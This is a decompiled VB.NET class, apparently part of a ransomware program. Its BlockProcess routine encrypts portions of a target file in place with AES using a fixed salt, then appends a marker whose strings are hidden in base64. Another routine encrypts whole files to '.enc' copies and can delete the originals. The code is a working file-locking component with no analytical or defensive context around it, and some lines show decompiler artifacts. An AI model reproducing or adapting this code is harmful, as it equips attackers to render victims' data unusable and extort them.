Imports System
Imports System.IO
Imports System.Linq
Imports System.Security.Cryptography
Imports System.Text

Namespace Complex
	' Token: 0x0200001D RID: 29
	Friend Class Blocks
		' Token: 0x060000BE RID: 190 RVA: 0x0000B12C File Offset: 0x0000932C
		Public Shared Sub TrimFile(filename As String, bytesToDelete As Integer)
			Dim fileInfo As FileInfo = New FileInfo(filename)
			Dim fileStream As FileStream = fileInfo.Open(FileMode.Open)
			fileStream.SetLength(Math.Max(0L, fileInfo.Length - CLng(bytesToDelete)))
			fileStream.Close()
		End Sub

		' Token: 0x060000BF RID: 191 RVA: 0x0000B168 File Offset: 0x00009368
		Public Shared Function GetEven(input As Long) As Integer
			Return CInt(input)
		End Function

		' Token: 0x060000C0 RID: 192 RVA: 0x0000B188 File Offset: 0x00009388
		Public Shared Sub BlockProcess(fileInfo As String, PartialSize As String, DynamicPass As String)
			Using fileStream As FileStream = New FileStream(fileInfo, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite)
				Dim num As Integer = Blocks.GetEven(fileStream.Length) / 3
				Dim num2 As Integer = Convert.ToInt32(PartialSize) * Convert.ToInt32(fileStream.Length) / 100
				If num < num2 Then
					num2 = num - 1024
				End If
				Dim num3 As Integer = 32
				Dim count As Integer = CInt(Math.Round(CDbl(num2) / CDbl(num3), MidpointRounding.AwayFromZero)) * num3
				For i As Integer = 0 To 2 - 1
					Dim clear As Byte() = Blocks.ReadFromFile(fileStream, count, num * i)
					Dim encrypted As Byte() = Encryptions.AESEncryptBytes(clear, Encoding.ASCII.GetBytes(DynamicPass), New Byte() { 1, 2, 3, 4, 5, 6, 7, 8 })
					Blocks.WriteToFile(fileStream, encrypted, num * i)
				Next
			End Using
			Dim bytes As Byte() = Encoding.ASCII.GetBytes(Program.Base64Decode("QmxvY2tz") + Program.Base64Decode("LQ==") + Convert.ToString(PartialSize) + Program.Base64Decode("LQ=="))
			Using fileStream2 As FileStream = New FileStream(fileInfo, FileMode.Append, FileAccess.Write, FileShare.ReadWrite)
				fileStream2.Write(bytes, 0, bytes.Length)
			End Using
		End Sub

		' Token: 0x060000C1 RID: 193 RVA: 0x0000B2E4 File Offset: 0x000094E4
		Public Shared Function Base64Decode(base64EncodedData As String) As String
			Dim bytes As Byte() = Convert.FromBase64String(base64EncodedData)
			Return Encoding.UTF8.GetString(bytes)
		End Function

		' Token: 0x060000C2 RID: 194 RVA: 0x0000B308 File Offset: 0x00009508
		Public Shared Function RandomByteArray(length As Integer) As Byte()
			Dim array As Byte() = New Byte(length - 1) {}
			Dim result As Byte()
			Using rngcryptoServiceProvider As RNGCryptoServiceProvider = New RNGCryptoServiceProvider()
				rngcryptoServiceProvider.GetBytes(array)
				result = array
			End Using
			Return result
		End Function

		' Token: 0x060000C3 RID: 195 RVA: 0x0000B354 File Offset: 0x00009554
		Public Shared Function AESEncryptFile(filePath As String, password As Byte(), delete As Boolean) As Boolean
			Dim array As Byte() = Blocks.RandomByteArray(16)
			Dim result As Boolean
			Using fileStream As FileStream = New FileStream(filePath + ".enc", FileMode.Create)
				Dim rfc2898DeriveBytes As Rfc2898DeriveBytes = Blocks.GenerateKey(password, array)
				password = Nothing
				GC.Collect()
				Using aes As Aes = New AesManaged()
					aes.KeySize = 256
					aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8)
					aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8)
					aes.Padding = PaddingMode.ISO10126
					aes.Mode = CipherMode.CBC
					fileStream.Write(array, 0, array.Length)
					Using cryptoStream As CryptoStream = New CryptoStream(fileStream, aes.CreateEncryptor(), CryptoStreamMode.Write)
						Using fileStream2 As FileStream = New FileStream(filePath, FileMode.Open)
							Dim array2 As Byte() = New Byte(0) {}
							rfc2898DeriveBytes.Dispose()
							Try
								While True
									Dim num As Integer = fileStream2.Read(array2, 0, array2.Length)
									Dim count As Integer = num
									If num <= 0 Then
										Exit For
									End If
									cryptoStream.Write(array2, 0, count)
								End While
								If delete Then
									File.Delete(filePath)
								End If
								cryptoStream.Close()
								fileStream.Close()
								fileStream2.Close()
								result = True
							Catch ex As Exception
								result = False
							End Try
						End Using
					End Using
				End Using
			End Using
			Return result
		End Function

		' Token: 0x060000C4 RID: 196 RVA: 0x0000B540 File Offset: 0x00009740
		Public Shared Function AESDecryptFile(filePath As String, password As Byte(), keep As Boolean) As Boolean
			Dim array As Byte() = New Byte(15) {}
			Dim result As Boolean
			Using fileStream As FileStream = New FileStream(filePath, FileMode.Open)
				fileStream.Read(array, 0, array.Length)
				Dim rfc2898DeriveBytes As Rfc2898DeriveBytes = Blocks.GenerateKey(password, array)
				password = Nothing
				GC.Collect()
				Using aes As Aes = New AesManaged()
					aes.KeySize = 256
					aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8)
					aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8)
					aes.Padding = PaddingMode.ISO10126
					aes.Mode = CipherMode.CBC
					Using cryptoStream As CryptoStream = New CryptoStream(fileStream, aes.CreateDecryptor(), CryptoStreamMode.Read)
						Using fileStream2 As FileStream = New FileStream(filePath.Remove(filePath.Length - 4), FileMode.Create)
							Dim array2 As Byte() = New Byte(0) {}
							rfc2898DeriveBytes.Dispose()
							Try
								While cryptoStream.Read(array2, 0, array2.Length) > 0
									fileStream2.Write(array2, 0, array2.Length)
								End While
								cryptoStream.FlushFinalBlock()
								fileStream2.Close()
								fileStream.Close()
								cryptoStream.Close()
								result = True
							Catch ex As Exception
								result = False
							End Try
						End Using
					End Using
				End Using
			End Using
			Return result
		End Function

		' Token: 0x060000C5 RID: 197 RVA: 0x0000B724 File Offset: 0x00009924
		Public Shared Function AESEncryptBytes(clear As Byte(), password As Byte(), salt As Byte()) As Byte()
			Dim result As Byte() = Nothing
			Dim rfc2898DeriveBytes As Rfc2898DeriveBytes = Blocks.GenerateKey(password, salt)
			password = Nothing
			GC.Collect()
			Using aes As Aes = New AesManaged()
				aes.KeySize = 256
				aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8)
				aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8)
				aes.Padding = PaddingMode.None
				aes.Mode = CipherMode.CBC
				Using memoryStream As MemoryStream = New MemoryStream()
					Using cryptoStream As CryptoStream = New CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write)
						cryptoStream.Write(clear, 0, clear.Length)
						cryptoStream.Close()
					End Using
					result = memoryStream.ToArray()
				End Using
				rfc2898DeriveBytes.Dispose()
			End Using
			Return result
		End Function

		' Token: 0x060000C6 RID: 198 RVA: 0x0000B840 File Offset: 0x00009A40
		Public Shared Function AESDecryptBytes(encrypted As Byte(), password As Byte(), salt As Byte()) As Byte()
			Dim result As Byte() = Nothing
			Dim rfc2898DeriveBytes As Rfc2898DeriveBytes = Blocks.GenerateKey(password, salt)
			password = Nothing
			GC.Collect()
			Using aes As Aes = New AesManaged()
				aes.KeySize = 256
				aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8)
				aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8)
				aes.Padding = PaddingMode.None
				aes.Mode = CipherMode.CBC
				Using memoryStream As MemoryStream = New MemoryStream()
					Using cryptoStream As CryptoStream = New CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Write)
						cryptoStream.Write(encrypted, 0, encrypted.Length)
						cryptoStream.Close()
					End Using
					result = memoryStream.ToArray()
				End Using
				rfc2898DeriveBytes.Dispose()
			End Using
			Return result
		End Function

		' Token: 0x060000C7 RID: 199 RVA: 0x0000B95C File Offset: 0x00009B5C
		Public Shared Function CheckPassword(password As Byte(), salt As Byte(), key As Byte()) As Boolean
			Dim result As Boolean
			Using rfc2898DeriveBytes As Rfc2898DeriveBytes = Blocks.GenerateKey(password, salt)
				Dim bytes As Byte() = rfc2898DeriveBytes.GetBytes(32)
				result = bytes.SequenceEqual(key)
			End Using
			Return result
		End Function

		' Token: 0x060000C8 RID: 200 RVA: 0x0000B9A8 File Offset: 0x00009BA8
		Public Shared Function GenerateKey(password As Byte(), salt As Byte()) As Rfc2898DeriveBytes
			Return New Rfc2898DeriveBytes(password, salt, 52768)
		End Function

		' Token: 0x060000C9 RID: 201 RVA: 0x0000B9C8 File Offset: 0x00009BC8
		Public Shared Function ReadFromFile(stream As FileStream, count As Integer, Optional offset As Integer = 0) As Byte()
			Dim array As Byte() = New Byte(count - 1) {}
			stream.Position = CLng(offset)
			stream.Read(array, 0, count)
			Return array
		End Function

		' Token: 0x060000CA RID: 202 RVA: 0x0000B9F5 File Offset: 0x00009BF5
		Public Shared Sub WriteToFile(stream As FileStream, encrypted As Byte(), Optional offset As Integer = 0)
			stream.Position = CLng(offset)
			stream.Write(encrypted, 0, encrypted.Length)
		End Sub

		' Token: 0x0400009D RID: 157
		Public Const AES256KeySize As Integer = 256
	End Class
End Namespace
